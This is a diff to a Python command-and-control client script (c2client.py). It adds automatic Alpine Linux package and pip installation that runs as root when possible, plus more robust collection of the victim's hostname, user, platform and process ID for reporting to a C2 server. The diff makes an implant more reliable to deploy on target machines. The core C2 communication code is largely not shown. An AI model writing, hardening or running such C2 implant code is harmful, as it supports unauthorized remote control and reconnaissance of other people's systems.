@@ -13,9 +13,167 @@ import os
 import sys
 import platform
 from datetime import datetime
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+def check_privileges():
+    """Check if script has sufficient privileges for package installation"""
+    if os.geteuid() == 0:
+        return True
+    
+    # Test if we can run apk commands
+    try:
+        result = subprocess.run(['apk', 'info'], capture_output=True, text=True, timeout=10)
+        return result.returncode == 0
+    except:
+        return False
+
+def check_and_install_dependencies():
+    """Check and install dependencies for Alpine Linux"""
+    print("[+] Checking system dependencies...")
+    
+    # Check if we're on Alpine Linux
+    is_alpine = False
+    try:
+        with open('/etc/os-release', 'r') as f:
+            os_info = f.read()
+            if 'alpine' in os_info.lower():
+                is_alpine = True
+                print("[+] Detected Alpine Linux")
+            else:
+                print("[INFO] Not Alpine Linux, skipping Alpine-specific setup")
+    except FileNotFoundError:
+        # Check for apk package manager as fallback
+        try:
+            subprocess.run(['apk', '--version'], capture_output=True, timeout=5)
+            is_alpine = True
+            print("[+] Detected Alpine Linux (via apk)")
+        except:
+            print("[INFO] Could not detect Alpine Linux, skipping system package installation")
+    
+    if is_alpine:
+        # Check privileges for system package installation
+        has_privileges = check_privileges()
+        if not has_privileges:
+            print("[WARNING] No privileges for system package installation. Some features may not work.")
+        
+        # List of system packages needed for cryptography and psutil
+        system_packages = [
+            'python3',
+            'py3-pip', 
+            'python3-dev',
+            'libffi-dev',
+            'openssl-dev',
+            'gcc',
+            'musl-dev',
+            'linux-headers'
+        ]
+        
+        # Check and install system packages if we have privileges
+        if has_privileges:
+            # Update package index first
+            try:
+                print("[+] Updating package index...")
+                subprocess.run(['apk', 'update'], capture_output=True, text=True, timeout=60)
+            except Exception as e:
+                print(f"[WARNING] Could not update package index: {e}")
+            
+            for package in system_packages:
+                print(f"[+] Checking system package: {package}")
+                try:
+                    result = subprocess.run(['apk', 'info', package], 
+                                          capture_output=True, text=True, timeout=30)
+                    if result.returncode != 0:
+                        print(f"[+] Installing system package: {package}")
+                        install_result = subprocess.run(['apk', 'add', package], 
+                                                      capture_output=True, text=True, timeout=120)
+                        if install_result.returncode != 0:
+                            print(f"[ERROR] Failed to install {package}: {install_result.stderr}")
+                            # Try to continue anyway
+                        else:
+                            print(f"[+] Successfully installed: {package}")
+                    else:
+                        print(f"[+] Package already installed: {package}")
+                except subprocess.TimeoutExpired:
+                    print(f"[ERROR] Timeout installing {package}")
+                except Exception as e:
+                    print(f"[ERROR] Error checking/installing {package}: {e}")
+        else:
+            print("[WARNING] Skipping system package installation due to insufficient privileges")
+    
+    # Python packages to install
+    python_packages = ['cryptography==41.0.7', 'psutil==5.9.6']
+    
+    for package in python_packages:
+        package_name = package.split('==')[0]
+        print(f"[+] Checking Python package: {package_name}")
+        try:
+            __import__(package_name)
+            print(f"[+] Package already available: {package_name}")
+        except ImportError:
+            print(f"[+] Installing Python package: {package}")
+            try:
+                # Try different pip installation methods
+                pip_commands = ['pip3', 'pip', 'python3 -m pip', 'python -m pip']
+                installed = False
+                
+                for pip_cmd in pip_commands:
+                    try:
+                        cmd_args = pip_cmd.split() + ['install', '--user', package]
+                        result = subprocess.run(cmd_args, 
+                                              capture_output=True, text=True, timeout=300)
+                        if result.returncode == 0:
+                            print(f"[+] Successfully installed {package} using {pip_cmd}")
+                            installed = True
+                            break
+                        else:
+                            print(f"[WARNING] {pip_cmd} failed: {result.stderr}")
+                    except FileNotFoundError:
+                        print(f"[WARNING] {pip_cmd.split()[0]} not found")
+                        continue
+                    except subprocess.TimeoutExpired:
+                        print(f"[ERROR] Timeout installing {package} with {pip_cmd}")
+                        continue
+                
+                if not installed:
+                    print(f"[ERROR] Failed to install {package} with any pip command")
+                    print("[INFO] Trying without --user flag...")
+                    # Try without --user flag as fallback
+                    for pip_cmd in pip_commands[:2]:  # Only try pip3 and pip
+                        try:
+                            cmd_args = pip_cmd.split() + ['install', package]
+                            result = subprocess.run(cmd_args, 
+                                                  capture_output=True, text=True, timeout=300)
+                            if result.returncode == 0:
+                                print(f"[+] Successfully installed {package} using {pip_cmd} (system-wide)")
+                                installed = True
+                                break
+                        except:
+                            continue
+                    
+                    if not installed:
+                        print(f"[CRITICAL] Could not install {package}. Script may not function properly.")
+                    
+            except Exception as e:
+                print(f"[ERROR] Error installing {package}: {e}")
+    
+    print("[+] Dependency check completed")
+
+# Import required modules after dependency check
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+except ImportError as e:
+    print(f"[ERROR] Failed to import cryptography: {e}")
+    print("[+] Running dependency check...")
+    check_and_install_dependencies()
+    try:
+        from cryptography.fernet import Fernet
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+        print("[+] Cryptography modules imported successfully after installation")
+    except ImportError:
+        print("[FATAL] Could not import cryptography even after installation attempt")
+        sys.exit(1)
 
 class C2Client:
     def __init__(self, server_host, server_port, password):
@@ -181,6 +339,7 @@ class C2Client:
                 'process_id': os.getpid()
             }
         except ImportError:
+            print("[WARNING] psutil not available, using basic system info")
             # Fallback if psutil not available
             info = {
                 'hostname': socket.gethostname(),
@@ -191,6 +350,15 @@ class C2Client:
                 'cpu_count': os.cpu_count(),
                 'current_user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
                 'working_directory': os.getcwd(),
+                'process_id': os.getpid()
+            }
+        except Exception as e:
+            print(f"[ERROR] Error gathering system info: {e}")
+            # Minimal fallback
+            info = {
+                'hostname': socket.gethostname(),
+                'platform': 'Unknown',
+                'current_user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
                 'process_id': os.getpid()
             }
         
@@ -350,6 +518,9 @@ class C2Client:
             self.connection.close()
 
 def main():
+    # Check and install dependencies first
+    check_and_install_dependencies()
+    
     if len(sys.argv) < 4:
         print("Usage: python3 c2client.py <server_host> <server_port> <password>")
         print("Example: python3 c2client.py 192.168.1.100 8888 mypassword")
